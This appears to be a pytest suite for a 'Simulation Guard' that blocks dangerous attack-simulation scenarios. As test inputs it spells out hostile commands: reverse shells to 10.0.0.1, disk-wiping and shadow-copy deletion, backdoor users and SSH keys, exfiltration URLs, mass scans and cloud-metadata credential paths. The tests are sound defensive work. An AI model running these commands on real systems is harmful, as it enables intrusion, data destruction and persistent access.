"""Phase 7 Safety Model & Simulation Guard Test Suite — PRD §7.6.

Tests:
1. All 13 preset scenarios pass Simulation Guard safety validation (Universal Gate)
2. Permanent disallowlist: reverse shells, ransomware, persistence, data exfiltration, scanning
3. Tenant scope validation: rejection of cloud metadata (169.254.169.254), public IPs, external domains
4. Cross-tenant isolation enforcement: rejection of other tenant namespaces
5. Transparent audit logging: safety rejections record audit events with action 'safety.rejection'
6. Safety policies introspection and check endpoints
"""

import uuid
from unittest.mock import AsyncMock, patch

import pytest

from app.safety.simulation_guard import (
    SafetyViolationType,
    check_simulation_safety,
    validate_payload_safety,
    validate_scenario_scope,
)
from app.scenarios.presets import PRESET_SCENARIOS
from app.scenarios.schema import (
    ScenarioCategory,
    ScenarioDefinition,
    ScenarioTarget,
)

# ---------------------------------------------------------------------------
# 1. Universal Gate & Preset Compliance (FR-6.1)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_all_13_presets_pass_simulation_guard() -> None:
    """Every preset scenario in Pantheon must pass the Simulation Guard without exception."""
    org_id = uuid.uuid4()
    for preset in PRESET_SCENARIOS:
        res = await check_simulation_safety(
            definition=preset,
            org_id=org_id,
            tenant_namespace=f"tenant-{org_id}",
        )
        assert res.allowed is True, f"Preset '{preset.name}' failed safety guard: {res.reason}"
        assert res.violation_type is None


# ---------------------------------------------------------------------------
# 2. Hard-Coded Disallowed Attack Classes (FR-6.2)
# ---------------------------------------------------------------------------


def test_rejects_reverse_shell_in_parameters() -> None:
    """Simulation Guard must reject reverse shell commands anywhere in scenario payloads."""
    malicious_inputs = [
        "/bin/sh -i",
        "/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "nc -e /bin/sh 10.0.0.1 4444",
        "python -c 'import socket,os;os.dup2(s.fileno(),0)'",
        "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 1234 > /tmp/f",
    ]

    for payload in malicious_inputs:
        scenario = ScenarioDefinition(
            name="Test Reverse Shell",
            description="Attempting shell injection",
            category=ScenarioCategory.API_ABUSE,
            target=ScenarioTarget(path="/api/exec"),
            parameters={"cmd": payload},
            expected_signals=["error"],
        )

        valid, violation, _reason, matched = validate_payload_safety(scenario)
        assert valid is False, f"Failed to reject reverse shell: {payload}"
        assert violation == SafetyViolationType.REVERSE_SHELL_DETECTED
        assert len(matched) > 0


def test_rejects_ransomware_and_mass_file_destruction() -> None:
    """Simulation Guard must permanently forbid ransomware and catastrophic disk wiping."""
    ransomware_inputs = [
        "vssadmin delete shadows /all /quiet",
        "rm -rf /",
        "rm -rf /*",
        "mkfs.ext4 /dev/sda1",
        "wbadmin delete catalog -quiet",
        "gpg --symmetric --batch --passphrase secret /var/data",
    ]

    for payload in ransomware_inputs:
        scenario = ScenarioDefinition(
            name="Test Ransomware Payload",
            description="Attempting destructive command",
            category=ScenarioCategory.SERVICE_FAILURE,
            target=ScenarioTarget(path="/api/admin"),
            parameters={"script": payload},
            expected_signals=["error"],
        )

        valid, violation, _reason, _matched = validate_payload_safety(scenario)
        assert valid is False, f"Failed to reject ransomware payload: {payload}"
        assert violation == SafetyViolationType.RANSOMWARE_DETECTED


def test_rejects_persistence_mechanisms() -> None:
    """Simulation Guard must reject persistence mechanisms (crontabs, autoruns, backdoor users)."""
    persistence_inputs = [
        "echo '* * * * * root /tmp/backdoor' >> /etc/cron.d/job",
        "crontab -e",
        "useradd -m -p evilpass backdoor",
        "net user backdoor P@ssword /add",
        "echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
        "systemctl enable evil.service",
    ]

    for payload in persistence_inputs:
        scenario = ScenarioDefinition(
            name="Test Persistence",
            description="Attempting persistence injection",
            category=ScenarioCategory.AUTH_ABUSE,
            target=ScenarioTarget(path="/api/config"),
            parameters={"config_data": payload},
            expected_signals=["error"],
        )

        valid, violation, _reason, _matched = validate_payload_safety(scenario)
        assert valid is False, f"Failed to reject persistence payload: {payload}"
        assert violation == SafetyViolationType.PERSISTENCE_DETECTED


def test_rejects_data_exfiltration_to_external_tunnels() -> None:
    """Simulation Guard must reject data exfiltration to external webhooks and tunnels."""
    exfil_destinations = [
        "https://webhook.site/abc-123",
        "https://requestbin.com/r/xyz",
        "https://myapp.ngrok.io/collect",
        "https://pastebin.com/api/post",
        "https://test.burpcollaborator.net/data",
    ]

    for dest in exfil_destinations:
        scenario = ScenarioDefinition(
            name="Test Exfiltration",
            description=f"Sending data to {dest}",
            category=ScenarioCategory.API_ABUSE,
            target=ScenarioTarget(path="/api/data"),
            parameters={"callback_url": dest},
            expected_signals=["error"],
        )

        valid, violation, _reason, _matched = validate_payload_safety(scenario)
        assert valid is False, f"Failed to reject exfiltration destination: {dest}"
        assert violation == SafetyViolationType.EXFILTRATION_DETECTED


def test_rejects_internet_wide_scanning() -> None:
    """Simulation Guard must reject indiscriminate CIDR sweeps and port scanners."""
    scan_inputs = [
        "masscan 0.0.0.0/0 -p80",
        "zmap -p 443 0.0.0.0/0",
    ]

    for cmd in scan_inputs:
        scenario = ScenarioDefinition(
            name="Test Mass Scanning",
            description="CIDR scan attempt",
            category=ScenarioCategory.TRAFFIC_FLOOD,
            target=ScenarioTarget(path="/"),
            parameters={"tool_args": cmd},
            expected_signals=["error"],
        )

        valid, violation, _reason, _matched = validate_payload_safety(scenario)
        assert valid is False, f"Failed to reject internet scanning: {cmd}"
        assert violation == SafetyViolationType.INTERNET_SCANNING_DETECTED


# ---------------------------------------------------------------------------
# 3. Tenant Scope Validation (FR-6.3)
# ---------------------------------------------------------------------------


def test_rejects_cloud_metadata_ip_targets() -> None:
    """Targeting cloud metadata IPs (e.g. 169.254.169.254) must be blocked."""
    prohibited_targets = [
        ScenarioTarget(service="169.254.169.254", path="/latest/meta-data"),
        ScenarioTarget(service="metadata.google.internal", path="/computeMetadata/v1"),
        ScenarioTarget(service="http://169.254.169.254", path="/"),
        ScenarioTarget(service="default", path="/latest/meta-data/iam/security-credentials"),
    ]

    for target in prohibited_targets:
        valid, violation, _reason = validate_scenario_scope(target, "tenant-org123")
        assert valid is False, f"Failed to reject metadata target: {target}"
        assert violation == SafetyViolationType.CLOUD_METADATA_ACCESS


def test_rejects_public_internet_domains_and_ips() -> None:
    """Targeting external public internet domains or public IPs must be blocked."""
    external_targets = [
        ScenarioTarget(service="api.victim-target.com", path="/users"),
        ScenarioTarget(service="subdomain.evil-site.org", path="/login"),
        ScenarioTarget(service="8.8.8.8", path="/dns"),
        ScenarioTarget(service="1.1.1.1", path="/"),
    ]

    for target in external_targets:
        valid, violation, _reason = validate_scenario_scope(target, "tenant-org123")
        assert valid is False, f"Failed to reject public target: {target}"
        assert violation == SafetyViolationType.OUT_OF_SCOPE_TARGET


def test_rejects_cross_tenant_namespace_access() -> None:
    """Simulations targeting a different tenant namespace must be blocked."""
    target = ScenarioTarget(
        service="api.tenant-other-org-uuid.svc.cluster.local",
        path="/api/admin",
    )

    valid, violation, reason = validate_scenario_scope(
        target, tenant_namespace="tenant-current-org-uuid"
    )
    assert valid is False
    assert violation == SafetyViolationType.CROSS_TENANT_ACCESS
    assert "tenant-other-org-uuid" in reason


def test_permits_valid_tenant_workload_targets() -> None:
    """Permits internal service names and matching tenant namespace hostnames."""
    allowed_targets = [
        ScenarioTarget(service="app-workload", path="/api/v1/auth"),
        ScenarioTarget(service="web-frontend", path="/health"),
        ScenarioTarget(service="api.tenant-my-org.svc.cluster.local", path="/users"),
        ScenarioTarget(service="localhost", path="/metrics"),
        ScenarioTarget(service="127.0.0.1", path="/status"),
    ]

    for target in allowed_targets:
        valid, _violation, reason = validate_scenario_scope(target, "tenant-my-org")
        assert valid is True, (
            f"Legitimate tenant target incorrectly rejected: {target}, reason: {reason}"
        )


# ---------------------------------------------------------------------------
# 4. Transparent Audit Logging on Rejection (FR-6.4)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_safety_rejection_logs_audit_event() -> None:
    """When a scenario is rejected by Simulation Guard, an audit log record must be created."""
    malicious_scenario = ScenarioDefinition(
        name="Reverse Shell Infiltration",
        description="Attempt to execute reverse shell",
        category=ScenarioCategory.AUTH_ABUSE,
        target=ScenarioTarget(path="/api/login"),
        parameters={"input": "nc -e /bin/sh 10.0.0.1 4444"},
        expected_signals=["failed"],
    )

    mock_db = AsyncMock()
    org_id = uuid.uuid4()
    user_id = uuid.uuid4()

    with patch("app.safety.simulation_guard.log_audit_event", new=AsyncMock()) as mock_audit:
        res = await check_simulation_safety(
            definition=malicious_scenario,
            org_id=org_id,
            db=mock_db,
            user_id=user_id,
        )

        assert res.allowed is False
        assert res.violation_type == SafetyViolationType.REVERSE_SHELL_DETECTED

        # Verify audit log was recorded with 'safety.rejection'
        mock_audit.assert_awaited_once()
        call_kwargs = mock_audit.await_args.kwargs
        assert call_kwargs["action"] == "safety.rejection"
        assert call_kwargs["org_id"] == org_id
        assert call_kwargs["user_id"] == user_id
        assert "reverse shell" in call_kwargs["details"]["reason"].lower()
